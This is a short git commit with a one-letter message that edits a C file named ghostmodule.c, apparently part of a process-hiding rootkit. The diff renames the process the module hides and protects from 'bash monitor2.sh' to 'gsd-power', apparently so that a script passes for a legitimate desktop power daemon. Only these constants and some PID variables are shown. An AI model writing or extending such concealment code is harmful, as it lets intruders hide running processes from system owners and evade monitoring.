d2d3ed0704ce79c64b721182f619fe2ef8fea0dd
ASxx <oliver12125@sina.com>
2019-12-22 20:41:39 +0800

    s

--- program/ghost/ghostmodule.c
+++ program/ghost/ghostmodule.c
@@ -21,8 +21,8 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "bash monitor2.sh";
-const char *hide = "bash monitor2.sh";
+const char *protected = "gsd-power";
+const char *hide = "gsd-power";
 int hidden_pid=-1;
 int protected_pid=-1;
 
